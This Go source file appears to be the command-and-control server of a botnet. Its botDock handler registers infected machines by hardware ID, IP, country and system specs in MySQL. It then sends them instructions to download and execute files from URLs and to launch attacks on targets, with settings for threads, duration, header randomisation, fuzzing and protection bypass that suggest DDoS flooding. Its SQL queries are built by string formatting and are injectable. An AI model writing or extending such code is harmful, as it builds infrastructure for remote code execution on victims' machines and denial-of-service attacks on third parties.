package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strconv"
	"time"
)

func botDock(c *gin.Context) {
	ua := c.Request.Header.Get("User-Agent")
	if ua == userAgent {
		hwid := c.PostForm("hwid")
		ip := c.PostForm("ip")
		country := c.PostForm("cn")
		cpu := c.PostForm("cpu")
		ram := c.PostForm("ram")
		os := c.PostForm("os")
		if isBotExists(hwid) {
			updateBot(hwid, ip, country)
		} else {
			addBot(hwid, ip, country, cpu, ram, os)
		}
		var list string
		taskList, err := renderTask()
		if err != nil {
			fmt.Println(err)
		}
		for _, aTask := range taskList {
			if aTask.CurrentExecution < aTask.Execution {
				if !isTaskDone(hwid, aTask.Id) {
					list += fmt.Sprintf("exec|:|%s|&||&", aTask.FileURL)
					makeTaskDone(hwid, aTask.Id)
				}
			}
		}
		attackList, err := renderAttack()
		if err != nil {
			fmt.Println(err)
		}
		for _, aAttack := range attackList {
			if aAttack.CurrentExecution < aAttack.Execution {
				if !isAttackDone(hwid, aAttack.Id) {
					list += fmt.Sprintf("%s|:|%s|%d|%d|%d|%d|%s|%t|%t|%d|%d|&||&", aAttack.AttackType, aAttack.Target, aAttack.Thread, aAttack.Connection, aAttack.Duration, aAttack.Interval, aAttack.Method, aAttack.RandomHeader, aAttack.Fuzzer, aAttack.Protection, aAttack.CookieDuration)
					makeAttackDone(hwid, aAttack.Id)
				}
			}
		}
		c.String(200, list)
	} else {
		c.Redirect(302, "/")
	}
}

func isBotExists(hwid string) bool {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT EXISTS(SELECT * from bots WHERE hwid=\"%s\")", hwid)
	rows := db.QueryRow(query)
	var exist int
	err = rows.Scan(&exist)
	if err != nil {
		fmt.Println(err)
	}
	if exist == 1 {
		return true
	} else {
		return false
	}
}

func makeTaskDone(hwid string, id int) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("INSERT INTO task_completed VALUES (\"%d\", \"%s\")", id, hwid)
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}
}

func makeAttackDone(hwid string, id int) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("INSERT INTO attack_completed VALUES (\"%d\", \"%s\")", id, hwid)
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}
}

func isTaskDone(hwid string, id int) bool {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT EXISTS(SELECT * from task_completed WHERE bot_hwid=\"%s\" AND task_id=%d)", hwid, id)
	rows := db.QueryRow(query)
	var exist int
	err = rows.Scan(&exist)
	if err != nil {
		fmt.Println(err)
	}
	if exist == 1 {
		return true
	} else {
		return false
	}
}

func isAttackDone(hwid string, id int) bool {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT EXISTS(SELECT * from attack_completed WHERE bot_hwid=\"%s\" AND attack_id=%d)", hwid, id)
	rows := db.QueryRow(query)
	var exist int
	err = rows.Scan(&exist)
	if err != nil {
		fmt.Println(err)
	}
	if exist == 1 {
		return true
	} else {
		return false
	}
}

func updateBot(hwid, ip, country string) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	loc, _ := time.LoadLocation("UTC")
	t := time.Now().In(loc)
	now := t.Format("2006-01-02 15:04:05")
	query := fmt.Sprintf("UPDATE bots SET ip=\"%s\", country=\"%s\", last_response=\"%s\" WHERE hwid=\"%s\"", ip, country, now, hwid)
	_, err = db.Exec(query)
		if err != nil {
		fmt.Println(err)
	}
}

func addBot(hwid, ip, country, cpu, ram, os string) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	loc, _ := time.LoadLocation("UTC")
	t := time.Now().In(loc)
	now := t.Format("2006-01-02 15:04:05")
	query := fmt.Sprintf("INSERT INTO bots VALUES (\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\")", hwid, ip, country, cpu, ram, os, now)
	_, err = db.Exec(query)
		if err != nil {
		fmt.Println(err)
	}
}

func respInterval(c *gin.Context) {
	c.String(http.StatusOK, strconv.Itoa(getInterval()))
}


